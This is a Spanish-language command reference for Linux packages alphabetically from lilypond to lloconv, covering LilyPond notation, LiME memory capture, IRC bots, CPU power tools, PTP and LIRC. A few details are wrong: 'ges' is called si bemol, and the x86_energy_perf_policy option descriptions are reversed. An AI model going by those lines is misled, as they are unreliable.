$ lilypond -f ps ejemplo.ly -o ejemplo (indica que solo genere el archivo PostScript [.ps] para saltarse la etapa de conversión a PDF si esta falla)
Nota.- por defecto crea un .pdf pero con -f puede especificarse crear un png y un svg. Si en el texto se especifica \midi { } crea un archivo.midi
Un ejemplo de archivo en formato lilypond para crear una escala de Do mayor en modo relativo:
$ nano ejemplo.ly
      \version "2.24.1"
      \header {
        title = "Escala de Do Mayor"
	}
	\score {
	  \new Staff {	     % Crea un pentagrama
	      \time 4/4      % Indicación de compás
	      \clef treble   % Clave de sol
	      \relative c'' { % Modo relativo [las notas se calculan a partir de la anterior]. Para una escala inferior colocar: c'
	            c4 d e f g a b c c1 |  % Do, Re, Mi, Fa, Sol, La, Si, [negras, duración 4] y Do [redonda, duración 1]
	      \bar "|."       % Barra final
		      }
	       }
	        \layout { }
		\midi { }
 	}
\header --> Define el título y otra información de cabecera.
\score --> Contiene la expresión musical principal.
\new Staff --> Crea un nuevo pentagrama.
\time 4/4 --> Establecen el compás
\clef treble --> Establece la clave.
\relative c' --> Pone el modo relativo, donde el "c'" inicial establece el Do central como nota de referencia. Para una octava superior: c''
c4 d e f g a b c --> Define las notas. El número "4" indica una negra. Si no se especifica la duración como en "d", "e", etc. toma la duración de la nota anterior.
|. --> Marca la barra final
$ lilypond -f ps ejemplo.ly -o ejemplo (crea ejemplo.ps y ejemplo.midi)
$ ps2pdf ejemplo.ps (convierte a ejemplo.pdf)
$ timidity ejemplo.midi (para escuchar el .midi)
Algunas instrucciones sobre la anotación:
\time 2/4 --> el compas
\clef bass --> clave de fa
\chords --> acordes
\addlyrics --> letra
dis --> re sostenido
ges --> si bemol
' { c4 d ...} --> sube el contenido una octava respeco a lo que indica "\relative c' {"
Un ejemplo más completo:
$ nano ejemplo.ly
       \version "2.24.1"
       %
       \header {
         title = "Linux es un sistema genial"
	   composer = "Ejemplo LilyPond"
	   }
	   %
       \score {
         <<
	     % --- Voz superior (melodía con letra)
	     \new Staff = "melody" <<
	     \clef treble
	     \key c \major
	     \time 4/4
           \new Voice = "mel" {
	   \relative c' {
	             c4 d e2               % negras y blanca
		     r4 g g a              % silencio + melodía
                     b4 c2 r4              % blanca y silencio
           }
           }
	         \new Lyrics \lyricsto "mel" {
		 Li -- nux es un sis -- te -- ma ge -- nial
           }
         >>
         %
         % --- Voz inferior (acompañamiento de acordes)
	     \new Staff = "chords" <<
	     \clef bass
	     \key c \major
	     \time 4/4
	     \relative c {
	             <c e g>1                % acorde de do mayor (blanca extendida al compás)
		     <f a c>1                % acorde de fa mayor
		     <g b d>1                % acorde de sol mayor
		     }
	    >>
	   >>
	   %
	     \layout { }  % para la partitura en PDF
	     \midi { \tempo 4=80 }  % para generar MIDI
	   }
$ lilypond -f ps ejemplo.ly -o ejemplo
$ ps2pdf ejemplo.ps
$ timidity ejemplo.midi


lilypond-doc-html-es
Documentación HTML en español del software de composición tipográfica de música lilypond. Acceder con el navegador a la dirección:
	file:///usr/share/doc/lilypond/html/Documentation/changes/index.es.html


lilyterm
Emulador de terminal.
$ lilyterm -g 90x10 -T terminal -t 3 -d /home/usuario (Con determinadas medidas, título, 3 pestañas y abriendo en las tres un directorio)
Algunos atajos:
	Ctrl + t (Abrir nueva pestaña)
	Ctrl + d (Cerrar pestaña)
	Ctrl + RePag (Ir a pestaña anterior)
	Ctrl + AvPag (Ir a pestañas siguiente)


lime-forensics-dkms
lime [Linux Memory Extractor] es un módulo [.ko] que permite extraer la RAM completa de una máquina Linux en tiempo real. La herramienta admite la adquisición de memoria tanto en el sistema de archivos del dispositivo como a través de la red. Se usa para obtener una copia exacta de la memoria volátil sin reiniciar el sistema.
$ find /lib/modules/$(uname -r) -name 'lime.ko' (verificar que se tiene el módulo instalado)
$ mkdir ~/capturas (crear un directorio donde guardar la imagen)
$ cd ~/capturas
# insmod /lib/modules/$(uname -r)/updates/dkms/lime.ko "path=/home/USER/capturas/memoria.lime format=lime" (cargarlo especificando la ruta del archivo y cómo guardar la RAM)
Nota.- Otras opciones de formato de salida son raw y padded.
# rmmod lime (unload el módulo cuando se haya terminado)
Para analizar procesos, sockets, claves, etc.
$ pip install volatility3 (instalar el paquete)
$ vol -f memoria.lime windows.pslist (si fuera un volcado de una máquina Windows o Android, volatility soporta muchos tipos)
Nota.- Este módulo puede afectar la estabilidad del sistema si se usa mal. Solo se recomienda en entornos controlados de análisis, auditoría, laboratorio...


limesuite
Colección de herramientas de control y prueba para hardware de radiofrecuencia [RF] basado en los chips LMS7002M de Lime Microsystems.
$ LimeQuickTest (chequear el sistema)
$ LimeUtil --find (ver si detecta LimeSDR)
$ LimeUtil --update (actualizar el firmware del dispositivo)
$ LimeSuiteGUI (interfaz gráfica para configurar transceptores LMS7)


limnoria
Bot de IRC desarrollado en Python que destaca por su flexibilidad, robustez y facilidad de uso. Incorpora un sistema ACL [Listas de Control de Acceso] muy granular que permite definir permisos por usuario y por comando, ideal para gestionar canales de IRC con seguridad y detalle. Incluye las herramientas supybot, supybot-adduser, supybot-botchk, supybot-plugin-create, supybot-plugin-doc, supybot-reset-password, supybot-test y supybot-wizard.
$ supybot-wizard (crear la configuración inicial. Nombre del bot, canales de IRC a los que se debe conectar, plugins a cargar, contraseñas, credenciales del propietario...)
$ supybot config.conf (iniciar el bot con el archivo de configuración generado con supybot-wizard)
$ supybot-adduser datos/users.conf (añadir un usuario administrador)
$ supybot-botchk (verificar si el bot está en ejecución)
$ supybot-reset-password datos/users.conf (reiniciar contraseña)
$ supybot-test (ejecuta tests en plugins)
Algunos ejemplos de configuración
/msg BotNick identify contraseña (autenticarse)
/msg BotNick @addcapability usuario admin (permisos de administrador global)
/msg BotNick @canal addperm usuario #canal op (permisos de OP en un canal específico)
/msg BotNick @canal addperm usuario #canal1 op
/msg BotNick @removecapability usuario admin
/msg BotNick @load PluginName (cargar un plugin)
Una vez el bot está en un canal
!help (muestra ayuda)
!quote add "Hola mundo" (añade una cita)
!seen usuario (dice cuándo se vio por última vez a un usuario)
!tell usuario mensaje (envía un mensaje cuando el usuario esté activo)


linaro-bcb-util
Herramienta especializada que interactúa con el Bootloader Control Block [BCB], una pequeña porción de datos almacenada generalmente en la partición "misc" de dispositivos que usan cargadores de arranque compatibles con Android. Su propósito principal es controlar el comportamiento del cargador de arranque en el siguiente inicio del sistema. En una instalación normal de Debian en la que el cargador de arranque, típicamente GRUB, no utiliza el BCB, esta utilidad debería ser inútil ya que solo funciona en sistemas que arrancan desde cargadores de arranque compatibles con Android. Si, por ejemplo, si se instala o desinstala Debian en la partición del sistema de AOSP [Android Open Source Project], se puede usar esta utilidad para controlar el comportamiento del cargador de arranque para iniciar en modo de recuperación en el siguiente arranque.
Para los ejemplos se asume que se está en un dispositivo que tiene una partición misc que actúa como la partición BCB, y que el cargador de arranque del dispositivo es compatible con Android.
# linaro-bcb-util --read (mostrar el comando actual almacenado en el BCB)
# linaro-bcb-util --write --command "boot-recovery" (reiniciar el dispositivo, el cargador de arranque leerá el BCB y, si lo interpreta correctamente, iniciará en el modo de recuperación)
# linaro-bcb-util --write --command "boot-fastboot" (arrancar en fastboot)
# linaro-bcb-util --clear (eliminar cualquier instrucción previa del BCB, permitiendo que el cargador de arranque proceda con el arranque normal)


lincredits
Programa que convierte el archivo CREDITS de Linux a uno de los tres formatos compatibles: texto plano, LaTeX y HTML. Se debe especificar la ruta de un archivo CREDITS válido, normalmente /usr/src/linux/CREDITS)
Este paquete permite crear versiones optimizadas del archivo CRÉDITOS de Linux en texto plano, LaTeX o HTML.
$ lincredits creditos.txt (creará un archivo en el directorio actual con las credenciales optimizadas. Por defecto en .txt)
$ lincredits --html creditos.txt (lo creará en .html)
$ lincredits -o my_custom_credits.txt creditos.txt (lo envia al archivo especificado)


line
Utilidad que copia una línea desde el inicio hasta el final desde la entrada estándar a la salida estándar.  Siempre imprime al menos una nueva línea y devuelve un estado de salida distinto de 0 en EOF o error de lectura
	$ line
	linux es genial
	linux es genial
	---------------
	$ echo $?
	0
	---------------
	$ line
	^C
	---------------
	$ echo $?
	130
	---------------
	$


link
Crear enlaces entre ficheros.
$ link fichero1 fichero2 (crea un enllace fichero2 que apunta a fichero 2)


linkchecker
Herramienta muy útil para verificar la validez de enlaces en sitios web, documentos HTML, y otros recursos. Está diseñada para detectar enlaces rotos, errores de red, y otros problemas relacionados con enlaces. Además, puede trabajar en modo recursivo para comprobar enlaces en varias páginas enlazadas, y ofrece diferentes formatos de salida para facilitar el análisis.
$ linkchecker --output-html=resultado.html https://ejemplo.com (verificar un sitio web completo en modo recursivo y guardar la salida)
$ linkchecker --file=pagina.html --output=csv --output-file=resultado.csv (revisará los enlaces en pagina.html, y generará un archivo CSV con los resultados)
$ linkchecker --recursive --depth=2 https://ejemplo.com (comprueba enlaces en https://ejemplo.com y en las páginas enlazadas, hasta una profundidad de 2 niveles)
$ linkchecker --output-xml=resultado.xml --no-status  https://ejemplo.com (salida en XML y análisis de enlaces rotos)


linklint
Programa Perl con todas las funciones para verificar enlaces HTML locales o remotos y asegurarse de que no haya enlaces rotos [404].
$ linklint /@ -doc ~/linkdoc -root /var/www/html/site (análisis de directorios y subdirectorios y los informes en ~/linkdoc del sitio local especificado)
$ linklint -limit 2000 -doc ~/linkdoc -host http://localhost:8000/ (anlisis de un sitio web con un limite de 2000 htmls, por defecto 500)
Nota.- Los enlaces "mailto" o "javascript:void" són ignorados y en el informe se muestra "skipped actions"


links2
Navegador.
# links2 -driver fb -g web.com (modo gráfico en el las tty con framebuffer)
Atajos
	g (Especificar dirección URL a cargar)
	z (Retroceder en el historial, ir a la página anterior)
	Ctrl + r (Recargar la página)
	s (Administrar marcadores)
	Ctrl + s (Detener todas las conexiones)
	q (Salir del programa)
	/ (Buscar un texto en la página, a partir de la posición actual)
	? (Buscar un texto en la página, desde la posición actual)
	n (Ir a la coincidencia de búsqueda siguiente)
	N (Ir a la coincidencia de búsqueda anterior)
	\ (Alternar entre texto sin formato y HTML)
	= (Ver información de la página)
	| (Ver información de cabecera. Etiquetas META del HTML))
	f (Ver marco (frame) actual en pantalla completa)
	c (Copiar dirección URL del enlace actual)
	d (Descargar contenido del enlace actual)
	i (Ver imagen del enlace actual si el enlace apunta a una imagen)
	I (Descargar imagen del enlace actual si el enlace apunta a una imagen)


lintian
Muestra fallos en construcción de paquetes .deb [según la política de Debian]. Puede que algunos “warnings” [W] y “errores” [E] solo significan que el paquete no sigue los estandares marcados pero no afectan a su ejecución:
$ lintian paquete.deb


linux-boot-prober
Intentará averiguar cómo arranca la partición raíz especificada.
          # linux-boot-prober /dev/sda1
          /dev/sda2:/dev/sda1:Linux:/vmlinuz:/initrd.gz:root=/dev/sda1


linux-check-removal
Comprobar si la eliminación de un kernel es segura. está pensado para ser llamado desde los scripts prerm maintainer de los paquetes del núcleo Linux. Los scripts preinst, postinst, prerm y postrm de Debian son scripts que se ejecutan automáticamente antes o después de instalar o eliminar un paquete.
# linux-check-removal 5.10.0-8-amd64 (si se quiere eliminar manualmente un kernel viejo)


linux-cpupower
Herramientas y utilidades que te permiten inspeccionar y controlar los parámetros de ajuste relacionados con la gestión de energía y el rendimiento de la CPU en sistemas Linux especialmente aquellos que soportan las funcionalidades compatible con estas funciones. Esto significa que se puede ver cómo la CPU está manejando la frecuencia y los estados de ahorro de energía, y en algunos casos, modificarlos para optimizar el rendimiento o el consumo de energía. Incluye las herramientas cpupower, turbostat y x86_energy_perf_policy
# cpupower frequency-info (información detallada sobre el controlador de cpufreq en uso, las frecuencias disponibles, el gobernador actual y las CPUs afectadas)
# cpupower frequency-set -g performance (configurará todas las CPUs para que usen el gobernador `performance`, manteniéndolas a la máxima frecuencia posible)
Nota.- Los gobernadores de frecuencia son algoritmos que deciden cómo escalar la frecuencia de la CPU. Algunos comunes son "performance" [siempre al máximo rendimiento], "powersave" [prioriza el ahorro de energía], "ondemand" [escala según la carga] y "conservative" [similar a "ondemand" pero con un enfoque más gradual].
# cpupower -c 0-3 frequency-set -g powersave (aplicará el gobernador `powersave` a las CPUs del 0 al 3)
# cpupower frequency-set -g userspace (para establecer una frecuencia específica, primero cambiar el gobernador)
# cpupower frequency-set -f 1.5GHz (establece la frecuencia de la CPU a 1.5 GHz. Se puede usar unidades como Hz, KHz, MHz, GHz)
# cpupower idle-info (muestra los C-states [estados de inactividad] soportados por la CPU y las estadísticas de uso de cada uno)
# cpupower idle-set -d 3 (deshabilitaría el C-state 3. Cuidado al modificar estas configuraciones, ya que pueden afectar el consumo de energía y la estabilidad del sistema)
# turbostat (que informe cada 5 segundos con datos como la frecuencia, el porcentaje de tiempo en diferentes C-states, la temperatura del núcleo y el consumo de energía)
# turbostat -i 10 (monitorizar estadísticas con un intervalo específico [cada 10 segundos])
# turbostat --out ts.log sleep 60 (medir el impacto de un proceso específico. Ejecutar sleep 60 y luego guardar todas las estadísticas recopiladas durante ese tiempo en el archivo ts.log)
# turbostat --quiet --show "PkgWatt","Busy%","Core","CoreTmp" -i 1 (mostrar métricas específicas: consumo de energía del paquete, el porcentaje de ocupación, el número de núcleos y temperatura del núcleo, actualizándose cada segundo y sin el encabezado inicial)
# x86_energy_perf_policy --cpu all (mostrará el valor EPB [Energy-Performance Bias] actual para cada CPU)
# x86_energy_perf_policy --cpu all --epb performance (indicará al procesador que priorice el rendimiento para todas las CPUs)
Otras opciones: performance [máximo ahorro de energia y menos rendimiento], balance-performance, normal, balance-power y power [menos ahorro de energía y máximo rendimiento].
# x86_energy_perf_policy --cpu 0 --epb power (establecerá el EPB de la CPU 0 a "power", equivalente a 15, priorizando el ahorro de energía para ese núcleo)
# x86_energy_perf_policy --hwp-enable 1 (habilitar Turbo Boost si está soportado. Una vez habilitado, a menudo requiere un reinicio del sistema para deshabilitarse)
# x86_energy_perf_policy --turbo-enable 0 (deshabilitar Turbo Boost)
Nota.- Deshabilitar Turbo Boost puede reducir el consumo de energía y la temperatura máxima, a costa de un rendimiento máximo menor.
En sistemas Intel modernos, el controlador intel_pstate es a menudo el predeterminado y el más eficiente para gestionar la frecuencia. Si se necesita un control más manual, por ejemplo, para usar el gobernador userspace, a veces es necesario deshabilitar intel_pstate en el arranque del kernel y usar acpi-cpufreq en su lugar. La forma básica para deshabilitarlo es:
# nano nano /etc/default/grub
        GRUB_CMDLINE_LINUX_DEFAULT="intel_pstate=disable"
# update-grub (si se ha modificado)


linux-perf
Herramienta de análisis de rendimiento para Linux permite monitorear y analizar métricas de rendimiento tanto a nivel de hardware, contadores de CPU, caché, etc. como de software, eventos del kernel, trazas, etc. útil para identificar cuellos de botella, optimizar aplicaciones y diagnosticar problemas de rendimiento.
# sysctl -w kernel.perf_event_paranoid=1 (ajustar a usuarios regulares el acceso a eventos del kernel)
# perf list (listar eventos disponibles que se pueden monitorear)
# perf stat gcc hello.c (estadísticas de rendimiento de un comando, como la compilación de un programa con gcc)
# perf stat -e cycles,instructions,cache-misses gcc hello.c (especificar eventos concretos)
# perf stat -e cache-misses,cache-references python script.py (medir fallos de caché y ayudar a identificar problemas de rendimiento relacionados con el uso de la memoria caché)
# perf top (monitoreo en tiempo real)
# perf top --pid 1234 (filtrando por PID)
# perf record -F 1000 -a -g -- sleep 60 (muestrea a 1000 Hz, todo el sistema, captura la pila de llamadas en perf.data y ejecuta sleep durante 60 segundos)
# perf report (analiza y muestra los datos grabados en perf.data)
# perf --list-cmds (enumera los comandos de rendimiento más utilizados)
# perf --list-opts (enumera las opciones de rendimiento disponibles)
# perf script (leer perf.data creado por el registro perf y mostrar la salida del seguimiento)
1.-
Para monitorear una función específica del kernel, como tcp_sendmsg:
# perf probe --add tcp_sendmsg
# perf record -e probe:tcp_sendmsg -a -- sleep 5
# perf probe --del tcp_sendmsg
# perf report
Esto registra las llamadas a la función tcp_sendmsg durante 5 segundos y muestra un reporte detallado.


linux-sysctl-defaults
Contiene un archivo de configuración [/etc/sysctl.conf] de sysctl que establece algunos valores predeterminados adecuados para Linux.


linux-update-symlinks
Como linux-check-removal está pensado para ser llamado desde los scripts postinst y postrm maintainer de los paquetes del núcleo Linux. El script postinst debe pasar el primer argumento  install o upgrade dependiendo de si se ha realizado una nueva instalación o una actualización.
# linux-update-symlinks upgrade 6.1.0-10-amd64


linuxinfo
Muestra información del sistema: versión del kernel, número y tipo de procesadores, versión de la biblioteca del sistema (libc o glibc).
$ linuxinfo


linuxlogo
Muestra datos de la cpu junto al logo de distintas distros. Listado en /etc/linux_logo.conf.
$ linuxlogo -a (En monocromo ascii)
$ linuxlogo -b (tipo banner)
$ linuxlogo -L ubuntu (De una distro concreta)
$ linuxlogo -L randon_xy (logo aleatorio dentro de los disponibles en /etc/linux_logo.conf)
$ linuxlogo -L random_ba (aleatorio y en ascii)
$ linuxlogo -L redhat -F "Redhat linux 5.2\nkernel version 3.2.0-4-amd64" (Especificando logo y texto)


linux-version
Muestra los kernels instalados en el sistema.
$ linux-version list (los lista todos)
$ linux-version list | linux-version sort --reverse (lista los kernels y ordena del más nuevo al más viejo)


linuxptp
Herramientas para implementar el Protocolo de Tiempo de Precisión [PTP, IEEE 1588] en sistemas Linux. Este protocolo permite sincronizar relojes en una red con alta precisión [hasta nanosegundos], útil en entornos como telecomunicaciones, centros de datos y sistemas financieros. Incluye las herramientas hwstamp_ctl, nsm, phc2sys, phc_ctl, pmc, ptp4l, timemaster y ts2phc.
# ptp4l -i eth0 -m (sincroniza el reloj del sistema con otros dispositivos PTP en la red y en modo verbose [-m])
# pmc -u -b 0 'GET PORT_DATA_SET' (usar UDP en lugar de raw sockets y dominio PTP 0)
# hwstamp_ctl -i eth0 -t 1 -r 1 (-t 1 Habilita timestamping en TX y -r 1 en RX)
# phc_ctl eth0 set 1000000000 (ajusta el reloj PHC en eth0 1 segundo [1,000,000,000 ns])
# ts2phc -s /dev/ttyS0 -c eth0 -m (sincronizar con una fuente externa de tiempo serial [GPS] y dispositivo de destino)
# timemaster -f /etc/timemaster.conf (sincroniza el reloj usando tanto NTP como PTP. Requiere un archivo de configuración)
# nsm -i eth0 -m (monitorea la calidad del servicio de tiempo en la red)
# phc2sys -s eth0 -c CLOCK_REALTIME -m -w
        -s eth0 --> toma el tiempo del PHC [reloj de hardware] en eth0.
        -c CLOCK_REALTIME --> Sincroniza con el reloj del sistema.
        -w --> Espera a que ptp4l esté listo.
1.-
Ejemplo maestro/slave
Maestro [Grandmaster Clock]
# ptp4l -i eth0 -m --step_threshold=1 -s (ajusta el reloj en pasos grandes si la diferencia es >1 segundo)
Slave
# ptp4l -i eth0 -m -s (sincroniza con el maestro)


liquidctl
Herramienta multiplataforma que permite supervisar y controlar dispositivos internos del PC, especialmente relacionados con la refrigeración líquida AIO, ventiladores, y sistemas de iluminación RGB.
# liquidctl list (listar dispositivos compatibles conectados al sistema)
# liquidctl initialize all (inicializa todos los dispositivos tras el arranque, preparando el hardware para recibir comandos de control)
# liquidctl status (consultar el estado de los dispositivos, temperaturas, velocidades de ventiladores/bomba, estado LEDs, etc)
# liquidctl set pump speed 70 (fija la velocidad de la bomba al 70%)
# liquidctl --match kraken set pump speed 90 (especificando dispositivo)
# liquidctl set fan speed 25 10 30 50 40 100 (el ventilador variará entre esos valores según la temperatura interna del refrigerante: 25°C --> 10%, 30°C --> 50% y 40°C --> 100%)
# liquidctl --match kraken set sync color fading 350017 ff2608 (configura el color del LED con efecto degradado)
# liquidctl set led color fixed ff00cc (cambia el color de una tira LED o de los LEDs integrados a un tono particular)
Puede usarse en diferentes formatos: hexadecimal, rgb, hsv, etc.


liquidprompt
Ofrece un promt modificado con información y coloreado.
$ source /usr/share/liquidprompt/liquidprompt (activarlo al momento de instalar)
$ liquidprompt_activate (crea entrada en .bashrc)
$ liquidprompt_on (activa liquidprompt para este shell)
$ liquidprompt_off (lo desactiva)
$ liquidprompt_tag marca (etiqueta el shell actual con liquidprompt)
$ liquidprompt_OFF (dejar el prompt vacio solo con el simbolo $)


lirc
[Linux Infra-red Remote Control]. Proporciona los demonios y algunas utilidades a los sistemas Linux para recibir y enviar señales de infrarrojos [IR] para controlar dispositivos externos, como televisores, reproductores de DVD, equipos de sonido, etc. En esencia, LIRC traduce las señales IR recibidas del control remoto en eventos del sistema operativo como pulsaciones de teclas o movimientos del ratón o permite que la computadora envíe señales IR para controlar otros dispositivos. Se precisa un receptor/emisor de infrarrojos conectado a la computadora ya sea un dongle USB, un receptor GPIO en una Raspberry Pi, o un puerto IR integrado.
# systemctl enable lircd (activar el servicio al inicio)
# irexec -d (se ejecuta como demonio)
# irrecord -d /dev/lirc0 mi_nuevo_remoto.conf (guía a través de un proceso interactivo para capturar las señales IR de cada botón. Especifica dispositivo y archivo donde guardar la configuración)
$ irw (muestra las señales IR que LIRC está recibiendo y decodificando en tiempo real)
$ irsend SEND_ONCE MiTV KEY_POWER (envía la señal de la tecla una sola vez, nombre del control remoto definido en lircd.conf y nombre de la tecla que se quiere enviar)
$ irsend SEND_ONCE MiAmplificador KEY_VOLUMEUP (subir el volumen del amplificador)
$ irsend LIST MiTV "" (listar teclas disponibles para un control remoto específico)
$ mode2 -d /dev/lirc0 (ver las señales IR crudas que el hardware está detectando)
1.-
Ejemplo de configuración:
$ nano ~/.lircrc
        begin
            prog = irexec
            button = KEY_POWER
            config = systemctl poweroff
        end
        begin
            prog = irexec
            button = KEY_VOLUMEUP
            config = amixer set Master 5%+
        end
        begin
            prog = irexec
            button = KEY_VOLUMEDOWN
            config = amixer set Master 5%-
        end
        begin
            prog = irexec
            button = KEY_MUTE
            config = amixer set Master toggle
        end
         iniciar `irexec`:**
prog = irexec --> Indica que esta sección de configuración es para el programa irexec.
button = KEY_POWER --> La tecla del control remoto que se va a detectar. Este nombre debe coincidir con el nombre de la tecla en el archivo /etc/lirc/lircd.conf.
config = systemctl poweroff --> El comando de shell que se ejecutará cuando se presione la tecla KEY_POWER.
2.-
Ejemplo de configuración:
# nano /etc/lirc/lirc_options.conf
        driver = default
        device = /dev/lirc0
        output = /var/run/lirc/lircd
        pidfile = /var/run/lirc/lircd.pid
Se especifica el controlador [driver] que LIRC debe usar para comunicarse con el hardware IR y el dispositivo IR [/dev/lirc0].


listadmin
Herramienta para gestionar las colas de mensajes en Mailman, un popular software de gestión de listas de correo y es especialmente útil para los administradores de listas de correo que necesitan manipular mensajes que están en espera de aprobación por parte de los moderadores. Puede filtrar mensajes basándose en varios criterios, como la puntuación de SpamAssassin, el remitente, el asunto o el motivo de moderación.
$ listadmin -l nombre_de_la_lista (listar mensajes en la cola de moderación)
$ listadmin -a nombre_de_la_lista (aprueba todos los mensajes en la cola de moderación para la lista de correo especificada)
$ listadmin -r nombre_de_la_lista (rechaza todos los mensajes en la cola de moderación)
$ listadmin -s 5.0 nombre_de_la_lista (filtra y lista los mensajes con una puntuación de SpamAssassin mayor o igual a 5.0)
$ listadmin -d --sender=remitente@example.com nombre_de_la_lista (elimina todos los mensajes en la cola de moderación que provienen del remitente especificado)
$ listadmin -f --subject="asunto del mensaje" nombre_de_la_lista (busca y lista los mensajes en la cola de moderación que coinciden con el asunto especificado)


listres
Genera una lista de la base de datos de recursos de un widget. La lista muestra la clase en la que se define por primera vez cada recurso, el tipo y la instancia. Si no se proporcionan widgets específicos se imprimirá una lista de nombres de widgets y sus jerarquías de clase.
$ listres -all (todos)
$ listres -variable core (que los widgets se identifiquen por los nombres de las variables de registro de clase)


listserialportsc
Listar los puertos serie del pc. La salida contiene campos vid/pid/iserial.
$ listserialportsc


litecli
Interfaz de línea de comandos para SQLite con autocompletado, resaltado de sintaxis, formateo de salidas, historial de comandos, etc. También permite la impresión de datos tabulares.
$ litecli mi_base_de_datos.db (conectarse a una base de datos SQLite, si la DB no existe, se creará automáticamente)
$ litecli mi_base_de_datos.db -e "SELECT * FROM usuarios" > resultados.txt (redirigir la salida a un archivo)
$ litecli (entrar en la interfaz de la aplicación)
Para crear tablas, entrar datos, consultarlas, etc
        > CREATE TABLE usuarios (id INTEGER PRIMARY KEY, nombre TEXT, edad INTEGER);
        > INSERT INTO usuarios (nombre, edad) VALUES ('Ana', 28), ('Carlos', 35);
        > SELECT * FROM usuarios;
Escribir consultas en varias líneas, terminar con ";" y "Enter"` para ejecutar
        > SELECT *
        > FROM usuarios
        > WHERE edad > 30;


litecoind
Programa que ejecuta un nodo de Litecoin en segundo plano como un servicio [daemon]. Litecoin, es una criptomoneda descentralizada basada en un sistema de efectivo electrónico peer-to-peer [P2P]. Los usuarios poseen las claves criptográficas de su propio dinero y realizan transacciones directamente entre sí, con la ayuda de una red P2P para comprobar el doble gasto. Incluye la herramienta litecoin-cli
Configuración inicial
$ nano ~/.litecoin/litecoin.conf
        rpcuser=tu_usuario
        rpcpassword=tu_contraseña_segura
        rpcallowip=127.0.0.1
        rpcport=9332
        daemon=1
        server=1
        txindex=1
Establece parámetros como el puerto, la interfaz RPC y las credenciales de acceso.
rpcuser y rpcpassword --> Credenciales para la comunicación RPC.
rpcallowip --> Restringe el acceso RPC, en este caso, solo localhost.
rpcport --> Puerto para la comunicación RPC, 9332 es el predeterminado para Litecoin.
daemon=1 --> Ejecuta litecoind como daemon.
server=1 --> Habilita el servidor RPC.
txindex=1 --> Mantiene un índice de todas las transacciones.
$ litecoind (inicia el nodo en segundo plano, sincronizando la blockchain)
Nota.- La primera vez puede tomar varias horas o días dependiendo de tu conexión y hardware, ya que debe descargar toda la blockchain de Litecoin [~50 GB en 2025].
$ litecoind -testnet (inicia el nodo en la red de prueba sin usar monedas reales)
$ litecoin-cli stop (envía una señal al daemon para que se cierre de manera segura)
$ ps aux | grep litecoind (verificar si el daemon está corriendo)
$ litecoin-cli getblockchaininfo (información sobre el estado de la blockchain, como el número de bloques sincronizados, la red [mainnet/testnet], y más)
$ litecoin-cli gettransaction "txid_aqui" (dará detalles como el monto, las direcciones involucradas y las confirmaciones)
$ litecoin-cli getnewaddress (genera una nueva dirección para recibir Litecoin)
$ litecoin-cli getbalance (muestra el saldo disponible en la billetera del nodo)
$ litecoin-cli sendtoaddress "Lxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" 1.5 (envía 1.5 LTC a la dirección especificada. Asegurar fondos y tarifas de red)
$ litecoin-cli listtransactions (muestra un historial de transacciones asociadas con la billetera del nodo)
$ litecoin-cli getblock "000000000000000123abc..." (devuelve detalles sobre un bloque específico, identificado por su hash)
$ litecoin-cli -testnet getblockchaininfo (ejecutar en testnet si se está ejecutando la red de prueba)


litmus
Conjunto de pruebas para probar la conformidad de un servidor WebDAV [Web Distributed Authoring and Versioning] con el protocolo especificado en la RFC 2518. Ejecuta una serie de pruebas para verificar si el servidor soporta correctamente las operaciones definidas por el protocolo, como operaciones de copia/movimiento, gestión de propiedades, bloqueos, entre otros. Aunque pasar las pruebas de litmus no garantiza que el servidor funcione perfectamente con todos los clientes WebDAV, es una herramienta útil para identificar problemas de compatibilidad.
$ litmus http://dav.example.com/path/ jim 2518 (ejecutará todas las suites de pruebas [http, basic, copymove, locks, props, etc.] y generará un informe en la terminal en el servidor especificado con el nombre de usuario jim y contraseña 2518)


live-boot
Conjunto de scripts y herramientas para iniciar un sistema operativo completamente funcional desde un medio extraíble como USB, CD/DVD o red, sin necesidad de instalarlo en el disco duro.
Está diseñado para configurar el entorno de arranque en tiempo real, montando el sistema de archivos en memoria [RAM] o desde el dispositivo de almacenamiento, y no está pensado para ser instalado en un sistema convencional. Cuando se inicia una imagen Debian Live, los componentes de live-boot se encargan de detectar el medio de arranque [USB, CD, PXE, etc.], cargar el sistema de archivos raíz [squashfs, ext4, etc.] y configurar el entorno en memoria [tmpfs para persistencia opcional].


lksctp-tools
Herramientas para interactuar con el protocolo SCTP [Stream Control Transmission Protocol] del kernel de Linux, un protocolo de transporte que, a diferencia de TCP o UDP, soporta múltiples flujos dentro de una misma conexión, ofrece características de multihoming [varias direcciones IP para una misma conexión], y proporciona un control de congestión fiable y ordenado de mensajes. Incluye varias herramientas: sctp_darn, sctp_status y sctp_test.
$ checksctp (determina si el kernel admite SCTP)
Para enviar mensajes manualmente:
$ sctp_darn -H 127.0.0.1 -P 5000 -l (iniciar como servidor)
$ sctp_darn -H 127.0.0.1 -P 5000 (en otro terminal, como cliente)
$ sctp_status 127.0.0.1 5000 (muestra información sobre streams, estado de asociación, direcciones IP asociadas, etc.)
$ sctp_test -H 127.0.0.1 -P 6000 -l (en el servidor. Herramienta de prueba automatizada para medir rendimiento y validar características de SCTP)
$ sctp_test -H 127.0.0.1 -P 6000 -n 100 -s "Hola SCTP" (en el cliente. envia 100 mensajes con el mensaje)
# modprobe sctp (cargar el módulo, si no lo está)
# iptables -A INPUT -p sctp -j ACCEPT (asegurar que el firewall no lo bloquee)


llgal
Generador de galerías de imagenes.
$ llgal --title "Vacaciones del 2024"--sx 800 --sy 600 --exif (especificando título,  medidas para verlas en el navegador y mostrar los datos exif)
$ llgal --clean (limpiar el directorio de los archivos creados por llgal. No borra las imágenes)
$ llgal --exif --li -L -R --title "Viaje al Sur" --sx 800 --sy 600 (añade metadatos EXIF, reemplazar etiquetas de enlaces en las diapositivas, no crear miniaturas para textos y enlaces, incluye subcarpetas y poner un título a la galería)


lloconv
Herramienta diseñada para convertir archivos de diferentes formatos de documentos utilizando las capacidades de LibreOffice por medio de la API LibreOfficeKit. Esto significa que puede manejar la conversión entre prácticamente todos los formatos que soporta LibreOffice, como ODT, DOCX, XLSX, PPTX, PDF, entre otros.
$ lloconv archivo.docx archivo.pdf (convierte el archivo archivo.docx a archivo.pdf)
$ lloconv datos.xlsx datos.ods (convertir una hoja de cálculo XLSX a ODS)
$ lloconv documento.odt documento.pdf (convertir ODS a PDF)


lltag
